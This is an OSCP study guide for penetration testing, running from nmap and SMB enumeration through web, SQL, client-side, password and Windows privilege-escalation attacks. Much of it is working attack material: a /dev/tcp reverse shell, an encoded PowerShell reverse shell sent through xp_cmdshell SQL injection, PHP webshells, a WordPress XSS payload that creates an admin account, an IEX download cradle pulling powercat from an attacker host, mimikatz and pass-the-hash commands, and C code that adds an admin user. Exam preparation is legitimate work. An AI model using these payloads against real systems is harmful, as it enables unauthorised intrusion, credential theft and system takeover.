# OSCP
Notes and study guide for the OSCP certification.

# Enumeration
## NMAP
Generates high amount of traffic in the scanned machine, so we must know this can be recognized by traffic analyzers or packet scanners. The more ports are open, the more traffic is generated. A scan of all 65535 ports will generate about 4MBs of traffic. A full TCP/UDP scan on all the ports for 254 hosts (eg: 192.168.1.0/24) can reach over 1GB of traffic over the time for the scanned machine. That for sure can be detected.

### TCP SYN Scan
```bash
nmap -Ss <target>
```
Send **SYN** request to a machine, whitout handshake. In this way a **SYN-ACK** is sent back to the sender and we know the port is open. The requester at the end does not send the final ACK, resulting in less noise in the network. In this way less traffic and less steps are done in the scan process.

### TCP Connect Scan
```bash
nmap <target>
```
Performs a full TCP connection. This is the default method of NMAP. It takes longer because the handshake is completed.

### UDP Scan
```bash
nmap -sU <target>
```
Apart from port-specific protocols, like **SMTP** or others, it sends an **ICMP** (ICMP port unreachable method) packet to the receiver port and wait for response. Here (but not only here) **sudo** is required because the system access the raw socket in order to implement the IPv4 protocol in user space. This is because sending and receiving raw packets requires root access on a Unix or Mac system. On Windows, you will have to use an administrator account.

### Network Sweeping
```bash
nmap -sn <target-range>
```
The discovery sends the UDP requests, but also a TCP SYN packet to port 443 and a TCP ACK packet to port 80 and ICMP requests for the traditional [ping sweep](https://it.wikipedia.org/wiki/Ping_sweep). This is done for each host. For a specific sweep, it could be used a more effective scan with:
```
nmap -p <PORT> <target>
```

### Most common ports
```bash
nmap -sT <target>
```

### Traceroute
```bash
nmap -A <target>
```

### OS Fingerprint
```bash
nmap -O <target>
```
Try to guess the operating system behind the server, based on how the server is responding. This is effective because the TCP/IP stack is implemeted differently in the Operating Systems. The result fingreprint is then matched with a list of fingerprint of many OS. Adding **--osscan-guess** we get a guess of the OS.

### Server Banners
```bash
nmap -sV <target>
```
In order to have a better understanding of the service we can try to read the server fingerprint for that port. This increase the traffic for the scan.

### [NMAP Scripting Engine](https://nmap.org/book/nse.html)
```bash
nmap -sV -sC --script=banner -p 80,443 <target>
```
With the directive --script we can specify the script we want. With the -sC the "default" scripts are used. In this case we only want HTTP/HTTPS banners, so we scan only the 80 and 443 ports.

Integrates user created script for automated scanning. To read more about the script we are using we can run
```bash
nmap --script-help <SCRIPT-NAME>
```
The list of script can be found at **/usr/share/nmap/scripts**.
To use a custom NMAP script (.nes script) we must download it first from Github and move it in the NMAP script folder. After we run `sudo nmap --script-updatedb` and we will use the script with 
```bash
nmap -sV --script "cve-script-name" <target>
```

### LOLBin approach for NMAP on Windows
```powershell
Test-NetConnection -Port <PORT> <HOST>
```
With some **powershell** scripting, the util **Test-NetConnection** can be used as a **NMAP** scan both for TCP and UDP.
```powershell
1..10000 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("target-ip", $_)) "TCP port $_ is open"} 2>$null
```

## SMB 
Server Message Block is a protocol used in Microsoft systems to exhange file or messages.
It has been attacked over the years and this led to an implementation to a better software: **Netbios**. Netbios is a session layer protocol that lets computers in the same network communicate and listens on port TCP 139. SMB is on port TCP 445. NBT (Netbios over TCP is often required to run among SMB for compatibility). There are many useful tools to scan Netbios, like **NMAP** or **nbtscan**. The following scenario uses `-r` that indicates nbtscan to use port UDP 137, the Netbios Name service port.
```bash
sudo nbtscan -r <target-range>
```
To scan for SMB shares it can be used the tool `enum4linux` and then the connection can be tested with
```bash
smbclient -L //<IP>
```
With -L for share listing and then
```bash
smbclient //<IP> -U <USER>
```
To connect to a specific share (in this case without password protection)

NMAP offers too many scripts for enumeration or information gathering on Windows Host with Netbios enabled (eg: `--script smb-os-discovery`).
From Windows the smb connections can be tested with
```powershell
net view \\<host> /all
```
With `/all` we can list Administrators shares ending with `$`

SMB can be exploited if the `signing is disabled`, with a [NTLM Relay attack](https://hackdefense.com/publications/het-belang-van-smb-signing/) we will cover in the next sections. Systems are susceptible to an NTLM relay attack because the recipient does not verify the content and origin of the message.

## SMTP
Simple Mail Transfer Protocol is a standard protocol for mail transmission. It can be enumerated on port 25 with netcat.
We can ask for known users or bruteforce the server for gaining information.
```bash
nc -nv <target> 25
> VRFY username
...
> EXPN username
```
With `VRFY` (verify) we ask to the server if the username is present and with `EXPN` (expand) if which mailing lists the user is subscribed to.
On a Windows system we can use
```powershell
Test-NetConnection -Port 25 <target>
```
Or `telnet`.

### SWAKS
Swaks is a good tool for interacting with SMTP servers. It offers also an easy way to attach files. This is a good alternative to netcat for email sending.
```bash
swaks --to receiver@mail.com --from sender@mail.com --auth LOGIN --auth-user sender@mail.com --header-X-Test "Header" --server <TARGET-IP> --attach file.txt
```

## SNMP
Simple Network Management Protocol or SNMP is a UDP based protocol, implemented at the beginning in not a very safe way. It has a database (MIB) with information related to network. The default SNMP port is 161 UDP. Until the third version of this protocol, SNMPv3 this protocol was poorly secured.
There are many tools to use here because SNMP can tell us many things about an organization, based on the response of the server. We can use `onesixtyone` for basic bruteforce and enumeration and `snmpwalk` to access data in MIB database.
The “SNMP community string” is like a user ID or password that allows access to a router's or other device's statistics.
SNMP community strings are used only by devices which support the SNMPv1 and SNMPv2c protocol. SNMPv3 uses username/password authentication, along with an encryption key.
By convention, most SNMPv1-v2c equipment ships from the factory with a read-only community string set to “public”. It is standard practice for network managers to change all the community strings to customized values in the device setup.

```bash
snmpwalk -c public -v1 -t 5 <target>
```
In this way we enumerate all the MIB tree of a SNMPv1 version with a timeout of 5 seconds, on the target IP.
```
# MIB Value        Microsoft Windows SNMP parameters
1.3.6.1.2.1.25.1.6.0         System Processes
1.3.6.1.2.1.25.4.2.1.2         Running Programs
1.3.6.1.2.1.25.4.2.1.4         Processes Path
1.3.6.1.2.1.25.2.3.1.4         Storage Units
1.3.6.1.2.1.25.6.3.1.2         Software Name
1.3.6.1.4.1.77.1.2.25         User Accounts
1.3.6.1.2.1.6.13.1.3         TCP Local Ports
```

To search deeaper use the extend functionality of SNMP. As suggested in [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce)

```bash
apt-get install snmp-mibs-downloader
snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

# Web Application Pentesting
Web application penetration testing is the practice of simulating attacks on a system in an attempt to gain access to sensitive data, with the purpose of determining whether a system is secure. These attacks are performed either internally or externally on a system, and they help provide information about the target system, identify vulnerabilities within them, and uncover exploits that could actually compromise the system. It is an essential health check of a system that informs testers whether remediation and security measures are needed. <!-- https://www.synopsys.com/glossary/what-is-web-application-penetration-testing.html --> 

With NMAP we can get the **fingerprint** of a webserver.
```bash
sudo nmap -p 443,80 --script=http-enum <target>
```
And can discover most popuar directories open on the server.

## Wordpress enumeration
We can enumerate WordPress pages and their plugins and themes with [wpscan](https://github.com/wpscanteam/wpscan). The following bash line will instruct wpscan to enumerate plugins in aggressive mode and print the output on a file

```bash
wpscan --url https://<TARGET> --enumerate p --plugins-detection aggressive -o dir/file.txt
```

## Web Technology
To perform a web tecnology enumeration, and to know for example which service the web server is running, we can use [WhatWeb](https://github.com/urbanadventurer/WhatWeb)

```bash
whatweb <URL>
```

## Gobuster
This is a tool that can discover hidden path in webservers. It uses wordlist to bruteforce directories, files or can perform a **Fuzzing** / **DNS** enumeration.
```bash
gobuster dir -u <target> -w /path/to/wordlist -t 10
```
In this case Gobuster is run with 10 threads with a directory bruteforce attack on the given target. Gobuster can also bruteforce APIs path
```bash
gobuster dir -u <target> -w /path/to/wordlist -p /path/to/api-pattern
```
Where the file `/path/to/api-pattern` is something like that
```txt
{GOBUSTER}/v1
{GOBUSTER}v2
```
Many times custom or not-standard APIs are the most vulnerable. Exploiting a login API, for example, we could log in into a web server with admin privileges.

With `-x` we can specify file extensions

```bash
gobuster dir -u <target> -w /path/to/wordlist -x php js aspx md txt jpg png
```

## Burp Suite
Is platform for Web App testing. It can works as a proxy, repeater, intruder, we can use it even for bruteforces attacks and many other things. We use it as proxy that intercepts requests, analyzes it and send them back to the server. The community edition can be used for free.
https://portswigger.net/burp. Burp Suite can be configured as a proxy and intercept traffic sent by a Firefox or Chrome browser. Requests can be viewed, modified, dropped etc...

# XSS
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. <!-- https://owasp.org/www-community/attacks/xss/ -->
XSS are divided in two types: **stored** that remains persistent on the webserver and **reflected** that are usually crafted to be inserted in a link and run-time executed .
The most common string to test an XSS vulnerability is
```javascript
<script>alert(1)</script>
```
In a case when our payload is stored actively on the server, for example if we inject an XSS inside the User Agent, the web administrator of the page could see the XSS (the popup) in his administration page (eg. Wordpress Panel). If the XSS is for example a redirect or some dangerous arbitrary code, many bad things can be done.

## Cookies
HTTP cookies, or internet cookies, are built specifically for web browsers to track, personalize and save information about each user’s session. A “session” is the word used to define the amount of time you spend on a site. Cookies are created to identify you when you visit a new website. The web server — which stores the website’s data — sends a short stream of identifying information to your web browser in the form of cookies. This identifying data (known sometimes as “browser cookies”) is processed and read by “name-value” pairs. These pairs tell the cookies where to be sent and what data to recall.  <!-- https://www.kaspersky.com/resource-center/definitions/cookies -->
Cookies can be found under **Storage** tab in the Browser inspect settings. Sessions cookies with **secure** flag can be sent only over HTTPS. The HttpOnly tells the browser to deny JavaScript access to cookies.

## Wordpress Nonce
WordPress nonces protect the platform against various malicious attacks, particularly cross-site request forgery (CSRF). This cyber attack exploits WordPress security vulnerabilities to trick users into submitting unwanted requests, from changing users’ login details to deleting user accounts. In the following way we can get a Nonce for a dinamically created user.
```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

And we can create the new user with

```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

We can then minify the attack with something like [JSCompress](https://jscompress.com/) and encode it in UTF-16 integer with [Cyberchef](https://gchq.github.io/CyberChef/) or charCodeAt JS function.
At this point we only need to find a way to inject it in the Server in a persistent way (XSS Stored). This can be done if the PHP part of the server doesn't sanitize input in the User-Agent or other parameters of the requerst headers. Once we got the admin access we can craft or use a WebShell plugin to enumerate and exploit the system. We can use something like https://github.com/p0dalirius/Wordpress-webshell-plugin.

#  Path Traversal and Local File Inclusion
A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system). <!-- https://owasp.org/www-community/attacks/Path_Traversal -->
Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others. <!-- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion -->

Exploiting a Path Traversal and a LFI in a server, could led us to open shell using a **simple reverse shell bash oneliner**, if we poison some part of the system, for example the Apache Logs in a Linux system, eg: [Apache Log Poisoning through LFI](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/).
```bash
bash -i >& /dev/tcp/<IP>/4000 0>&1
```

# Remote File Inclusion
Remote File Inclusion or RFI is done the same way of LFI, but we have to be the source of the malicious script. In the case of a PHP webserver, It could be
```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```
And we can call the script with an inclusion of it, eg: `http://webserver.com/index.php?page=http://<attacker-ip>/malicious-file.php` . On the attacker side we have first to launch a webserver with the malicious file with

```bash
python3 -m http.server 80
```

# File Uploads
For more examples, visit https://pentestmonkey.net/tools/web-shells/php-reverse-shell.
Going on, with File Upload vulnerabilities we can do a lot of things. A part from uploading a reverse-shell.php, we can also upload in specific places of the filesystem, dangerous file that could replace original ones. For example, replacing the /etc/passwd and the /etc/shadow file in a system, we could gain permission to log in with a "pre crafted" user.
This can be done exploiting a File Upload with something like `../../../../../../../../etc/passwd` and `../../../../../../../../etc/shadow` if the server doesn't sanitize file names.

# Command Injection
Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

This attack differs from Code Injection, in that code injection allows the attacker to add their own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code. <!-- https://owasp.org/www-community/attacks/Command_Injection -->
For example if a web server executes a command on the operating system below and doesn't sanitize the input, could let the attacker craft a payload with some special characters like `;` or `&&` that are used to concatenate commands in a sytem. A pratical example could be a server that arguments for a known command, eg: ls
```bash
http://<target-url>/pages/command=cmd=ls;id
```
In that case the webserver executes `ls` among with the `id` command.

# SQL Vulerabilities
## SQL Injection
SQL Injections are the most common form of injections because SQL databases are very popular in dynamic web applications. This vulnerability allows an attacker to tamper existing SQL queries performed by the web application. Depending on the queries, the attacker might be able to access, modify or even destroy data from the database.
Since databases are commonly used to store private data, such as authentication information, personal user data and site content, if an attacker gains access to it, the consequences are typically very severe, ranging from defacement of the web application to users data leakage or loss, or even full control of the web application or database server. <!-- https://probely.com/vulnerabilities/sql-injection -->

## SQL Union Based Attacks
When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack. <!-- https://portswigger.net/web-security/sql-injection/union-attacks -->

## Blind SQL Injection
Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.
When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the SQL Query’s syntax is incorrect. Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not impossible. <!-- https://owasp.org/www-community/attacks/Blind_SQL_Injection -->

This is a SQL Injection cheat sheet for testing https://github.com/payloadbox/sql-injection-payload-list.

## MSSQL Code Execution
In MSSQL thanks to the keyword execute, we can execute arbitrary command on the operating system below. To do that first we have to enable command execution inside the Database with

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Then execute commands with

```sql
EXECUTE xp_cmdshell 'whoami'
```
Putting all togheter, we can have very fancy injections adding multiple tools.

### impacket-mssqlclient
We can use **impacket-mssqlclient** with **-windows-auth** as login method in the **MSSQL** Database

```bash
proxychains python3 /home/kali/.local/bin/mssqlclient.py -port 1433 domain.com/user:password@<IP> -windows-auth
```

## Blind Reverse Shell - SQL Injection 
The following payload has been crafted with https://www.revshells.com/
```sql
'; EXECUTE xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='; --
```

## Uploading a PHP Backdoor from SQL
In other database scenarios we can abuse the `SELECT INTO_OUTFILE` statement and we can try to upload something malicious in the webserver. We must have write permission in the folder we will write the file into.
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
Next, with a simple GET request like `/tmp/cmd=whoami` we can execute commands on the webserver.


## SQLMAP
Finally, we can use something that automates the SQL exploits, like **sqlmap**. With this tool we can have automatic scan and checks for any type of vulnerability on the webserver using SQL and It can also automatically upload **reverse shells** to the server. For more information check directly the project documentation https://github.com/sqlmapproject/sqlmap. A basic usage of sqlmap could be the following code

```bash
sqlmap -u 'http://<target>/page.php?user=test' -p user
```

## Client Side Attacks
A Client Side Attack is an attack executed on client side. It could be in the victim's browser or in the victim's computer through malicious executables. This is usually a two-steps attack. In the first step usually we deploy the payload to the victim infrastructure using social engineer and OSINT. After the victim double-clicked the malicious file we sent or opened the malicious link, we can execute arbitrary code for any sort of action we want to do. The aim of Client Side Attacks is to gain an initial foothold in a non-routable internal network.

## Exploiting Windows Users with VBA Macros
We can craft a malicious Word file is very easy, Microsoft offers a very good guide to do it :) https://support.microsoft.com/it-it/office/creare-o-eseguire-una-macro-c6b99036-905c-49a6-818a-dfb98b7c3c9c. Inside the macro section we can insert a malicious reverse shell using https://github.com/glowbase/macro_reverse_shell that is a useful tool to craft fixed-size strings supported by Microsoft Macros.
On client side we open the reverse shell with 
```bash
nc -lvp <PORT>
```

## Exploiting Windows Users with WebDav mounts
With Windows libraries we can craft client-side attacks on Windows. We can serve this configuration for a WebDav mount on the victim's computer. First we start or WebDav listener in the Kali machine with

```bash
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
```

 We can craft the following `config.Library-ms` file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<ATTACKER-IP></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Then we can upload to the WebDAV a malicious **Windows Shortcut** file (lnk file) that points to the attacker malicious ip that servers a malicious exe for a reverseshell, like [powercat](https://github.com/besimorhino/powercat). In this section, a simple reverse shell won't work, but we have to use some webserver (like python webserver) with the executable available. Something like that could work for Windows 10/11
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER-IP:WEBPORT/powercat.ps1');
powercat -c ATTACKER-IP-NETCAT -p NETCAT-PORT -e powershell"
```

We copy inside the WebDAV the the link of the powershell command previously created and also the **config-Library.ms** file that we will send to the victim as the payload (via MAIL, SMB, etc...).

with our netcat listener on the attacker side.
```bash
nc -lvp NETCAT-PORT
```
# Finding Exploits
## Resources
Mainly there are two locations where you can find exploits. **Make sure you run exploits ONLY AFTER have read the code.**
```html
https://www.exploit-db.com/
https://www.metasploit.com/
```
Or inside the Linux installation of NMAP at `/usr/share/nmap/scripts`.

# Password Attacks
We can bruteforce logins with Password Attack metodology. This type of attacks uses a dictionary of usernames/passwords and tries to guess the credentials in the applications. It could be HTTPS, SSH, RDP etc...

## Hydra
A very good tool for password bruteforcing is hydra.

### SSH
The following attack uses the wordlist.txt file to bruteforce the admin user for SSH login.

```bash
hydra -L admin -P wordlist.txt <target-ip> ssh -t 4
```
If the password is know, It could be used the tecnique **password spraying** where the passwords remain constant and the username is bruteforced. This is useful if we gain passwords from a dataleak.

### RDP
A RDP attack could be this

```bash
hydra -L Administrator -P wordlist.txt <target-ip> rdp -t 4
```

### HTTP Basic Auth
This works with HTTP basic auth protocol

```bash
hydra -l admin -P rockyou.txt <target-ip> http-get
```

## Cracking Password
With John and Hashcat we can craft customized mutating wordlist that let us modify the original wordlist while executing. In the [Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack) are shown all possible combinations for password mutation. For example, the following rule capitalizes each first letter and adds `1` and then `!` for each word.

```txt
c $1
c $!
```

For a wordlist with the single word `test`, this will create the following mutated wordlist

```txt
Test1
Test!
```

The attack will be the following

```bash
hashcat --wordlist=/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/my-rule.rule user.hash
```

## KeePass file
If we dump a KeePass Database (Database.kdbx), we can try to crack it with

```bash
keepass2john Database.kdbx > keepass.hash
```
First we remove the "Database:" string from the hash, then we run our attack. The **13400** is the code for Hashcat to crack KeePass hashes.

```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## SSH Keys 
If we find a SSH Key password protected we can use

```bash
ssh2john id_rsa > id_rsa.hash
```

We remove the filename at the beginning of the hash, as in the KeePass section and we use JohnTheRipper to crack the hash, but first we add our hashcat rules to the John configuration rules (if we want to use custom rules)

```bash
cat /home/kali/passwordattacks/my-rule.rule >> /etc/john/john.conf
```

And then the attack is run with

```bash
john --wordlist=ssh.passwords --rules=sshRules id_rsa.hash
```

Now we can login with the SSH key and we can use the cracked passphrase.

## NTLM Hashes
The NTLM hash is the cryptographic format in which user passwords are stored on Windows systems. NTLM hashes are stored in the SAM (security account manager) or NTDS file of a domain controller. They are a fundamental part of the mechanism used to authenticate a user through different communications protocols. It’s, therefore, critical information and highly sought after by hostile actors when trying to unleash a cyber-attack. When pentesting, for example, it’s common for attackers to try to obtain these hashes (using tools such as pwdump or mimikatz) and use Pass The Hash techniques using NTLM hashes to exploit the privileges of one or more systems. In this way, they could execute elevated privileges and even execute commands. The NTLM hash is encoded by taking the user’s password and converting it into a 16-byte key using an MD4 hash function. This key is divided into two halves of 8 bytes each, which are used as input to three rounds of DES encryption to generate a 16-byte output that represents the NTLM hash. Each DES round uses an 8-byte key derived from the original key half using a parity operation. The two 8-byte results from the three DES rounds are concatenated to form the 16-byte NTLM hash that is used to verify the user’s password in the Windows operating system. NTLM hashes are likely to be used in many Windows authentication attacks, so it’s advisable to limit their use and use Kerberos. <!-- https://www.tarlogic.com/cybersecurity-glossary/ntlm-hash/ -->

### Mimikatz
[Mimikatz](https://github.com/ParrotSec/mimikatz) is a very useful tool that can do many things once executed on a Windows system, like dumping NTML hashes of the users. As their Github page says, it can be run with

```powershell
.\mimikatz.exe
```
Warning: Mimikatz's commands could not work depending on the Windows version. Make sure to download the correct version after checking with `systeminfo` the Windows version.

Then, if we have the privileges, it can be used to dump NTLM hashes with

```powershell
privilege::debug
token::elevate
lsadump::sam
```

To impersonate another user

```powershell
 sekurlsa::pth /user:Administrator /domain:<DOMAI> /ntlm:<NTLM-HASH> /impersonate
 ```

### Cracking the NTLM hashes
The **1000** code is for NTLM hashes. The username is dump along with the hash. The cracking is done with the following code

```bash
hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt
```

The plaintext credential we will find are used in the authentication method in the Windows system, like RDP, SMB or other services, if the user has the required privileges to use that services.

### Passing the NTLM hashes
The NTLM hashe can be used also as is if the protocol supports it. An example is SMB

```bash
smbclient \\\\<TARGET-IP>\\secrets -U Administrator --pw-nt-hash <NTLM-HASH>
```

We can escalate the writables shares with `impacket-psexec`, a oneliner tool that opens a reverse shell with the exploited target.

```bash
impacket-psexec -hashes 00000000000000000000000000000000:<NTLM-HASH> Administrator@<TARGET-IP>
```

### Cracking the Net-NTLMv2 hashes
One of the authentication protocols Windows machines use to authenticate across the network is a challenge / response / validation called Net-NTLMv2. If can get a Windows machine to engage my machine with one of these requests, we can perform an offline cracking to attempt to retrieve their password. In some cases, we could also do a relay attack to authenticate directly to some other server in the network. <!-- https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html -->

Once identified our interface, we can start our interceptor with

```bash
sudo responder -I <INTERFACE>
```

And from the Victim we only need to mount as a SMB share a fake provided path

```powershell
dir \\<ATTACKER-IP>\test
```

In this way `responder` will dump the hash that could be cracked with code **5600** on hashcat

```bash
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt --force
```

### Relaying the Net-NTLMv2 hashes
We can perform a `ntlmrelayx` attack if the gained hash is too difficult to be cracked. In this case the `<TARGET-IP>` is the second exploitable machine on the network.

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET-IP> -c "powershell -enc <ENCODED-REVSHELL>"
```

The encoded reverse shell can be crafted with some UTF16-BE malicious code crafted with https://www.revshells.com.
Then, we have to gain the hash from the first machine. 
We can do the same attack as before, mounting on the machine 1 the fake SMB share, in order to gain the hash.

```powershell
dir \\<ATTACKER-IP>\test
```

Now we `impacket-ntlmrelayx` will pass the hash to the second machine to authenticate us with the same hash. If the user is also the Administrator of the second machine, we will be logged as Administrator.

# Privilege Escalation

## Windows Privilege Escalation
We can use [Seatbelt](https://github.com/GhostPack/Seatbelt.git) and [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and then investigate on the results. It is also useful to check Powershell history and `Windows Event Viewer`. 
If the result for Windows doesn't display colors, add this REG value

```powershell
 REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 
```

## Enumeration
As always, enumerate all the possible things, login to SMB/SSH/Other services with default userames ad passwords or perform a _null login_ as the following

For rpcclient

```bash
rpcclient 10.10.10.192 -U""
```

For for smbclient

```bash
smbclient -L 10.10.10.192 -U""
```

## Service Binary Hijacking
### PowerUp
Another useful tool to check privilege escalation vector is [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). We can upload it on the victim's machine and then use it to gain knowledge and exploit the privileges misconfiguration on the services.
First, we enable the powershell scripting capability.

```powershell
powershell -ep bypass
```

Then we enable PowerUp

```powershell
. .\PowerUp.ps1
```

To list modifiable service we use

```powershell
Get-ModifiableServiceFile
```

Once we spot an interesting service, we can try to abuse it with

```powershell
Install-ServiceBinary -Name '<SERVICENAME>'
```

This will create the admin user `john` with password `Password123!`. To log-in with the created user we can restart the service (if we have the correct permissions and PowerUp.ps1 automatically uses the right arguments). Eventuall we can restart the machine in order to have all services restarted.
We also must notice that if the service requrie some additional configurations, for example passing a configuration file, the PowerUp.ps1 script will fail and we must exploit manually the privilege escalation, setting the right path to the configurations of the service (eg: mysql).

If we have to manually load a custom exploit into the service we can directly write the C code and compile it for our needs

```c
#include <stdlib.h>

int main ()
{
  int payload;
  
  payload = system ("net user john Password123! /add");
  payload = system ("net localgroup administrators john /add");
  
  return 0;
}
```

And then compile it with

```bash
x86_64-w64-mingw32-gcc payload.c -o payload.exe
```

## Service DLL Hijacking
